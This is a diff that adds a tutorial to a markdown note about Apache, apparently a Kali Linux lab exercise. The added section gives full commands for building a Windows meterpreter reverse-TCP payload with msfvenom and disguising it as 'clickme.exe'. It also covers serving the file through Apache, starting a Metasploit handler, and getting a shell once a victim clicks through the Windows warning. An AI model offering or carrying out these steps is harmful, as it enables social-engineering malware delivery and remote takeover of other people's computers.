@@ -4,5 +4,13 @@ Although we call Apache a web server, it is not a physical server, but rather a 
 When a visitor wants to load a page on your website, for instance, the homepage or your “About Us” page, their browser sends a request to your server, and Apache returns a response with all the requested files (text, images, etc.).The server and the client communicate through the HTTP protocol, and the Apache web server is responsible for the smooth and secure communication between the two machines.
 Apache is highly customizable, thanks to its open-source infrastructure. Due to this, web developers and users can adapt its source code according to the type of website they’re creating. 
 
+In order to start the Apache server we have to type in $`service apache2 start`. In order to check the status $`service apache2 status`. The folder where Apache2 is located is in the $`/var/www/html` This is where the Apache server sits in Kali Linux. Now if you were to go to the browser and type in your Kali's ip address, then it should take you to the Apache Default page. 
 
+Now we will need to create a payload $`msfvenom -p(p for payload) windows/meterpreter/reverse_tcp lhost=10.0.2.15 lport=5555 -f(file extension) exe -o(output) clickme.exe`. THe payload has been created, if we type the ls command, we can see the payload that we just created. Now we need to setup a listener in msfconsole. 
+
+In msfconsole, we will type in $`use exploit/multi/handler`. Once we setup our listener we will need to see waht variables we will need to set in order to get a shell. $`options` We will set the $`LHOST` and the $`LPORT`. After this we have to set payload $`set payload windows/meterpreter/reverse_tcp`. Now all of this is done, we can hit the $`run` command. 
+
+After we hit the run command it is waiting on the victim to click the link we want it to click. Once we put the $`10.0.2.15/clickme.exe` in the address bar. It will open a pop-up because the .exe file is not certified. The Windows security system will kick in and ask us if we want to open it and as soon as the victim says Yes. Voillaaaaaaa. Shell. 
+
+![clickme](https://user-images.githubusercontent.com/93686063/202246280-df2d0074-ea7c-4303-8e90-6aab17d8bc19.JPG)
 
